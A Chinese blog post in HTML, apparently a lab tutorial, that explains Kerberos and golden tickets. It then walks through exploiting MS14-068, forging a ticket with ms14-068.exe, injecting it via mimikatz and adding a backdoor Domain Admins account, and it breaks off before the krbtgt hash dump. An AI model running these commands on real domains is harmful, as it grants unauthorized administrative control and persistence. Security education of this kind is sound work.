@@ -1,0 +1,559 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Kerberos的基本概念Kerberos 是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。  Client代表用户，用户有自己的密码，Server上运行的服务也有自己的密码，KDC是受信任的三方认证中心，它拥有用户和服务的密码信息。 KDC服务默认会安装在域控中，C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PTT票据传递攻击">
+<meta property="og:url" content="https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Rone&#39;s Blog">
+<meta property="og:description" content="Kerberos的基本概念Kerberos 是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。  Client代表用户，用户有自己的密码，Server上运行的服务也有自己的密码，KDC是受信任的三方认证中心，它拥有用户和服务的密码信息。 KDC服务默认会安装在域控中，C">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251208105135373.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20260228152259477.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219153612406.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219153836909.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219153954121.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219155511215.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219160606543.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20260228152515055.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219160953175.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219165154688.png">
+<meta property="og:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219171421027.png">
+<meta property="article:published_time" content="2025-11-27T03:03:28.000Z">
+<meta property="article:modified_time" content="2026-03-02T07:44:18.667Z">
+<meta property="article:author" content="Rone">
+<meta property="article:tag" content="权限维持">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://godrone.github.io/images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251208105135373.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PTT票据传递攻击</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/categories/">分类</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/07/18/PTH-HASH%E4%BC%A0%E9%80%92/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&text=PTT票据传递攻击"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&is_video=false&description=PTT票据传递攻击"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PTT票据传递攻击&body=Check out this article: https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&title=PTT票据传递攻击"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&name=PTT票据传递攻击&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://godrone.github.io/2025/11/27/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/&t=PTT票据传递攻击"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.</span> <span class="toc-text">Kerberos的基本概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kerberos%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">Kerberos认证流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%A6%E7%BB%86%E8%AE%A4%E8%AF%81%E6%B5%81%E7%A8%8B"><span class="toc-number">2.1.</span> <span class="toc-text">详细认证流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%95%E4%B8%BAPAC"><span class="toc-number">2.2.</span> <span class="toc-text">何为PAC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">3.</span> <span class="toc-text">黄金票据</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86"><span class="toc-number">3.1.</span> <span class="toc-text">基本原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%8B%9F%E5%AE%9E%E6%88%98%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">模拟实战利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%B1%E5%AE%B3"><span class="toc-number">3.3.</span> <span class="toc-text">危害</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PTT票据传递攻击
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Rone</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-27T03:03:28.000Z" class="dt-published" itemprop="datePublished">2025-11-27</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" rel="tag">权限维持</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="Kerberos的基本概念"><a href="#Kerberos的基本概念" class="headerlink" title="Kerberos的基本概念"></a>Kerberos的基本概念</h2><p>Kerberos 是一种基于加密 Ticket 的身份认证协议。Kerberos 主要由三个部分组成：Key Distribution Center (即KDC)、Client 和 Service。</p>
+<ul>
+<li>Client代表用户，用户有自己的密码，Server上运行的服务也有自己的密码，KDC是受信任的三方认证中心，它拥有用户和服务的密码信息。</li>
+<li>KDC服务默认会安装在域控中，Client想要访问Server的服务（xxx service），前提是通过KDC认证，再由KDC发放的票据决定Client是否有权限访问Server的服务。</li>
+<li>KDC 服务框架中包含一个 Krbtgt 账户，它是在创建域时系统自动创建的一个账号，你可以暂时理解为他就是一个无法登陆的账号，在发放票据时会使用到它的密码 HASH 值。</li>
+</ul>
+<p><strong>关键角色：</strong></p>
+<p><strong>KDC（密钥分发中心）</strong>：在域环境中，KDC服务默认会安装在域控中，包含以下两个部分：</p>
+<ul>
+<li><strong>AS（认证服务）</strong>：验证Client的credential（身份认证信息），发放TGT 。</li>
+<li><strong>TGS（票据授权服务）：</strong> 票据授权服务，验证TGT，发放ST。</li>
+</ul>
+<p><strong>TGT（票据授权票据）：</strong> 由KDC的AS发放，客户端获取到该票据后，以后申请其他应用的服务票据（ST）时，就不需要向KDC的AS提交身份认证信息(credential)，TGT具有一定的有效期。由 KBRTGT HASH 加密的 sessionkey-as 和 Timestamp 等信息。</p>
+<p><strong>ST（服务票据）</strong>：由KDC的TGS发放，是客户端应用程序访问Server某个服务的凭证，Server端验证通过则完成Client与Server端信任关系的建立。</p>
+<p><strong>Session key</strong>：用来加密Client和TGS之间传输的数据。</p>
+<p><strong>Server session key</strong>：用来加密Client和Server之间传输的数据。</p>
+<p><strong>Client：</strong> 想要访问服务的用户或客户端。</p>
+<p><strong>Server：</strong> 客户端想要访问的特定服务。</p>
+<h2 id="Kerberos认证流程"><a href="#Kerberos认证流程" class="headerlink" title="Kerberos认证流程"></a>Kerberos认证流程</h2><p>大致认证流程如下图所示：</p>
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251208105135373.png" alt="image-20251208105135373"></p>
+<p>整个认证步骤，大致分为三个大阶段，共六个步骤：</p>
+<ul>
+<li>AS_REQ &amp; AS_REP </li>
+<li>TGS_REQ &amp; TGS_REP </li>
+<li>AP_REQ &amp; AP_REP</li>
+</ul>
+<p>Kerberos 协议的核心思想是：<strong>“不通过网络传输用户密码，而是通过加密票据来证明身份。”</strong></p>
+<p>为了理解这个过程，我们用一个经典的 <strong>“线下活动入场”</strong> 比喻：</p>
+<p><strong>KDC：</strong> 整个认证系统的核心大脑，它包含两个部分：</p>
+<ul>
+<li><strong>认证服务器（AS）：</strong> 活动大厅门口的<strong>总售票处</strong>，负责第一阶段的认证，验证你的身份，给你一个“通票”。</li>
+<li><strong>票据授予服务器（TGS）：</strong> 活动内部的<strong>分项目验票处</strong>，负责第二阶段的授权，你用“通票”来换取各个服务的“专场票”。</li>
+</ul>
+<p><strong>客户机（Client）：</strong> 你，想要访问服务的用户或客户端。</p>
+<p><strong>应用服务器（Server）：</strong> 你想参加的<strong>特定专场活动</strong>，客户端想要访问的特定服务。</p>
+<p><strong>Ticket：</strong> 票据，是证明你身份的凭证，被服务器的密钥加密过，客户端自己无法解密或伪造。</p>
+<p><strong>TGT：</strong> 一种特殊的票据，是通往 TGS 的“通票”。由 TGS 的密钥加密。</p>
+<p><strong>Session Key：</strong> 会话密钥，由 KDC 生成，用于 Client 和 Server 之间进行安全通信的一次性密钥。</p>
+<p><strong>域名：</strong> 整个活动的 <strong>主办方</strong></p>
+<p>你的目标是：最终进入 <strong>“特定专场活动”</strong>。</p>
+<h3 id="详细认证流程"><a href="#详细认证流程" class="headerlink" title="详细认证流程"></a>详细认证流程</h3><p><strong>阶段一：认证服务交换 - 获取“通票”</strong></p>
+<p><strong>目标：</strong> 向 AS 证明你是谁，并获取一个通往 TGS 的“通票”。</p>
+<ul>
+<li><strong>第1步： Client -&gt; AS（AS_REQ）</strong><ul>
+<li>客户端向认证服务器发送一个明文请求：“我是用户 <code>Alice</code>，我想要一个访问 TGS 的票据。”</li>
+<li><code>Client --(Alice 想要 TGT)--&gt; AS</code></li>
+</ul>
+</li>
+<li><strong>第2步： AS -&gt; Client（AS_REP ）</strong><ul>
+<li>AS 收到请求后，它会做两件事：<ol>
+<li>检查客户端ID是否在KDC数据库中，如果检查操作没有异常，那么将生成一个用于 Client 和 TGS 之间通信的 <strong>会话密钥</strong>。</li>
+<li>创建一个 <strong>TGT</strong>，里面包含：<code>Client ID</code>、<code>TGS Session Key</code>、时间戳、有效期等。<strong>这个 TGT 是用 TGS 的密钥加密的</strong>，所以 Client 看不懂，也改不了。</li>
+</ol>
+</li>
+<li>AS 将这两样东西回复给 Client：<ul>
+<li><strong>A部分：</strong> <code>TGS Session Key</code> 和 TGT 等信息，<strong>用 Alice 的密码派生出的密钥进行加密</strong>。只有正确的 Alice 才能解密。</li>
+<li><strong>B部分：</strong> <strong>TGT</strong> 本身（这个 TGT 是用 KDC 中<code>krbtgt</code>账户的密码 Hash (即<code>krbtgt</code>的密钥) 进行加密的，Client 无法解密）。</li>
+</ul>
+</li>
+<li><code>AS --(加密的Session Key + TGT)--&gt; Client</code></li>
+</ul>
+</li>
+<li><strong>此时，Client 收到回复后：</strong><ul>
+<li>它会尝试用 Alice 的密码派生的密钥来解密 A 部分。如果密码正确，就能成功取出 <code>TGS Session Key</code> 和 TGT 信息。</li>
+<li>如果密码错误，解密失败，认证流程就此终止。</li>
+<li><strong>从此以后，Client 不再需要输入或使用 Alice 的密码了。</strong></li>
+</ul>
+</li>
+</ul>
+<p><strong>阶段二：票据授予服务交换 - 获取“专场票”</strong></p>
+<p><strong>目标：</strong> 用刚才拿到的“通票（TGT）”去换取访问具体服务的“专场票”。</p>
+<ul>
+<li><strong>第3步： Client -&gt; TGS（TGS_REQ）</strong><ul>
+<li>客户端现在要准备两个东西发给 TGS：<ol>
+<li><strong>认证器：</strong> 用上一步获得的 <code>TGS Session Key</code> 加密的当前时间戳。这用来证明你就是刚才那个拿到 TGT 的人。</li>
+<li><strong>TGT：</strong> 从第2步拿到的那个（被 TGS 密钥加密的）票据。</li>
+<li>（同时告诉 TGS）你想访问哪个服务，例如 <code>host/server.example.com</code>。</li>
+</ol>
+</li>
+<li><code>Client --(TGT + 加密的认证器 + 目标服务名)--&gt; TGS</code></li>
+</ul>
+</li>
+<li><strong>第4步： TGS -&gt; Client（TGS_REP）</strong><ul>
+<li>TGS 收到请求后：<ol>
+<li>TGS 会使用自己的<code>krbtgt</code>账户的 Hash 来解密 TGT，取出里面的 <code>TGS Session Key</code> 和 Client ID 等信息。</li>
+<li>将客户端ID与TGT的客户端ID进行比较。</li>
+<li>用取出的 <code>TGS Session Key</code> 去解密认证器，验证请求的合法性（防止重放攻击）。</li>
+<li>验证 TGT 是否在有效期内。</li>
+</ol>
+</li>
+<li>如果全部通过，TGS 认为 Client 是可信的。然后它做两件事：<ol>
+<li>生成一个用于 Client 和 最终应用服务器之间通信的 <strong>服务会话密钥</strong>。</li>
+<li>创建一个 <strong>服务票据（ST）</strong>，里面包含：<code>Client ID</code>、<code>Service Session Key</code>、时间戳等。<strong>这个服务票据是用目标应用服务器的密钥加密的</strong>。</li>
+</ol>
+</li>
+<li>TGS 将这两样东西回复给 Client：<ul>
+<li><strong>A部分：</strong> <code>Service Session Key</code> 和服务票据等信息，<strong>用 <code>TGS Session Key</code> 加密</strong>。</li>
+<li><strong>B部分：</strong> <strong>服务票据</strong> 本身（已被应用服务器的密钥加密，Client 依然无法解密）。</li>
+</ul>
+</li>
+<li><code>TGS --(加密的Service Session Key + 服务票据)--&gt; Client</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>阶段三：客户端&#x2F;服务器认证交换 - 使用“专场票”入场（AP_REQ）</strong></p>
+<p><strong>目标：</strong> 拿着“专场票（ST）”去访问最终的服务。</p>
+<ul>
+<li><strong>第5步： Client -&gt; Application Server（AP_REQ）</strong><ul>
+<li>客户端现在准备两个东西发给应用服务器：<ol>
+<li><strong>认证器：</strong> 用第4步获得的 <code>Service Session Key</code> 加密的当前时间戳。</li>
+<li><strong>服务票据：</strong> 从第4步拿到的那个（被应用服务器密钥加密的）票据。</li>
+</ol>
+</li>
+<li><code>Client --(服务票据 + 加密的认证器)--&gt; App Server</code></li>
+</ul>
+</li>
+<li><strong>第6步： App Server -&gt; Client（AP_REP）</strong><ul>
+<li>应用服务器收到请求后：<ol>
+<li>用自己的密钥解密服务票据，取出里面的 <code>Service Session Key</code> 和 Client ID。</li>
+<li>用取出的 <code>Service Session Key</code> 去解密认证器，验证时间戳。</li>
+</ol>
+</li>
+<li>如果验证成功，服务器就确认了客户端的身份。</li>
+<li><strong>（可选，用于双向认证）</strong> 服务器可以从认证器中取出时间戳，用 <code>Service Session Key</code> 加密后发回给客户端，证明它也是真实的服务器（因为它能正确解密票据并获取 Session Key）。</li>
+<li><code>App Server --(可选：加密的时间戳+1)--&gt; Client</code></li>
+</ul>
+</li>
+</ul>
+<p><strong>至此，双向认证完成</strong>， Client 和 Server 都确认了对方的身份，服务器根据服务票据中包含的客户端 **PAC (Privilege Attribute Certificate)**信息 (包括用户的 SID、组 SID 等)，进行 <strong>授权</strong>，决定客户端是否有权限访问请求的资源。</p>
+<p><strong>Kerberos 的优势：</strong></p>
+<ul>
+<li><strong>密码不网络传输：</strong> 密码只在第一步本地生成密钥，用于解密，从未在网络上发送。</li>
+<li><strong>单点登录：</strong> TGT 有有效期，在有效期内，Client 无需再次输入密码，就可以用 TGT 换取访问任何已授权服务的票据。</li>
+<li><strong>双向认证：</strong> 客户端和服务端可以互相验证身份。</li>
+<li><strong>防重放攻击：</strong> 通过时间戳和认证器机制实现。</li>
+</ul>
+<h3 id="何为PAC"><a href="#何为PAC" class="headerlink" title="何为PAC"></a><strong>何为PAC</strong></h3><p><strong>我们知道在Kerberos最初的设计的流程里只说了如何证明客户端的真实身份, 并没有说明客户端是否有权限访问该服务,因为在域中不同的权限的用户 能够访问的资源是不同的,因此微软为了解决这个权限为题引入了PAC（特权属性证书）。</strong></p>
+<p><strong>引入PAC以后</strong>,在<strong>AS_REP阶段</strong>返回的TGT中会包含<strong>PAC</strong>，<strong>TGS_REQ阶段</strong>中client将带有PAC的TGT发送给KDC，KDC除了验证TGT的合法性以外，还会验证PAC的合法性，如果两者都验证通过，再重新构造新的PAC放在ST里返回给客户端，client带着这个PAC去请求服务，服务会根据PAC中的user id和group id来判断client具有的权限。</p>
+<p><strong>PAC主要有两个部分组成，一个是用户信息，一个是两个数字签名。</strong></p>
+<p>①用户信息：Client的User的SID、Group的SID等信息。根据用户信息去判断权限</p>
+<p>②数字签名：这两个签名的作用是确保PAC不被篡改</p>
+<h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><p><strong>黄金票据</strong> （Golden Ticket）是一种针对 Kerberos 认证中 <strong>TGT</strong> (Ticket Granting Ticket，票据授权票据）的伪造攻击，允许攻击者在获取特定凭据后，无限期地伪造任意域用户，包括域管理员。</p>
+<h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a><strong>基本原理</strong></h3><p>Kerberos 认证的核心在于 <strong><code>krbtgt</code>账户</strong>，它是域控制器 (KDC) 用于签发所有 TGT 的关键账户。如果攻击者能够获取到域控上<code>krbtgt</code>账户的 <strong>NTLM Hash</strong>，就意味着掌握了域内所有 TGT 的签名密钥。</p>
+<p>攻击者一旦拥有<code>krbtgt</code>的 Hash，就可以离线伪造任意用户身份的 <strong>TGT</strong>。这个伪造的 TGT 会被 KDC 认为是合法的，因为它用正确的<code>krbtgt</code> Hash 签名。有了伪造的 TGT，攻击者就可以向 KDC 申请 <strong>任意服务票据 (TGS)</strong>，从而访问域内任何资源，而无需与真正的用户密码进行交互，也不受用户密码修改的影响。</p>
+<p><strong>核心点</strong>：只要掌握了<code>krbtgt</code>的 Hash (通常通过 DCSync 或域控提权后 dump 获取)，就可以持续伪造有效的 TGT，实现对域的完全控制。</p>
+<p><strong>黄金票据伪造的所需条件</strong> </p>
+<ol>
+<li>域名称 </li>
+<li>域的 SID 值</li>
+<li>域的 KRBTGT 账号的 HASH</li>
+</ol>
+<h3 id="模拟实战利用"><a href="#模拟实战利用" class="headerlink" title="模拟实战利用"></a>模拟实战利用</h3><p><strong>实验环境</strong></p>
+<table>
+<thead>
+<tr>
+<th>主机名</th>
+<th>IP</th>
+<th>账号&#x2F;密码</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>12server2（域内主机）</td>
+<td>192.168.31.162</td>
+<td><strong>本地用户：</strong> administrator&#x2F;Aa123456!（本地管理员）<br /><strong>域用户：</strong> user1&#x2F;12345678（域普通用户）</td>
+</tr>
+<tr>
+<td>08server-dc（域控）</td>
+<td>192.168.31.160</td>
+<td><strong>本地用户：</strong> administrator&#x2F;QWEasd123（本地管理员）<br /><strong>域用户</strong>： admin&#x2F;Aa123456（域管理员），user1&#x2F;12345678（域普通用户）</td>
+</tr>
+</tbody></table>
+<p><strong>利用过程</strong></p>
+<p>先在域内主机12server2进行域内信息收集。</p>
+<p>通过命令：<code>net config workstation</code>,可知域名为：hack 和其他信息。</p>
+<p>通过命令：<code>nltest /dsgetdc:域名</code>,可知 DC 主机名为：08server-dc。</p>
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20260228152259477.png" alt="image-20260228152259477"></p>
+<p>这里利用 MS14-068 来进行提权,先检查下是否有 MS14-068, CVE 编号CVE-2014-6324, 补丁为 KB3011780 。</p>
+<p>查看域控制器是否有打补丁：systeminfo |find “3011780”,如果返回为空就说明没有打补丁,存在漏洞,需要注意的是域内普通用户提权成功后是有时效性的。</p>
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219153612406.png" alt="image-20251219153612406"></p>
+<p>访问 08server-dc 失败 提示拒绝访问。</p>
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219153836909.png" alt="image-20251219153836909"></p>
+<p>通过<code>whoami /user</code> 或者<code>whoami /all</code> 查看hack用户的 suid。</p>
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219153954121.png" alt="image-20251219153954121"></p>
+<p>使用 MS14-068 伪造票据进行提权，使用以下命令会在当前目录下生成一个<code>TGT_user1@hack.club.ccache</code>凭证。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用方法：ms14-068.exe  -u 域成员名@域名 -p 域成员密码 -s 域成员sid -d 域控制器地址</span><br><span class="line">ms14-068.exe -u user1@hack.club -p 12345678 -s S-1-5-21-3604103733-3768248241-1190196746-1105 -d 08server-dc.hack.club</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219155511215.png" alt="image-20251219155511215"></p>
+<p>使用 mimikatz 清空之前缓存的凭证，导入伪造的凭证：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # kerberos::purge 	#清空票据</span><br><span class="line">mimikatz # kerberos::ptc 票据文件地址		#导入票据地址</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219160606543.png" alt="image-20251219160606543"></p>
+<p>此时再访问域控资源，发现已经可以访问成功，说明现在我们有域管的权限。</p>
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20260228152515055.png" alt="image-20260228152515055"></p>
+<p>添加一个域管账号：hack1</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user hack1 Qwe123... /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; hack1 /add /domain</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/PTT%E7%A5%A8%E6%8D%AE%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/image-20251219160953175.png" alt="image-20251219160953175"></p>
+<p>登录域管用户，使用一下命令导出用户 krbtgt 的 hash：</p>
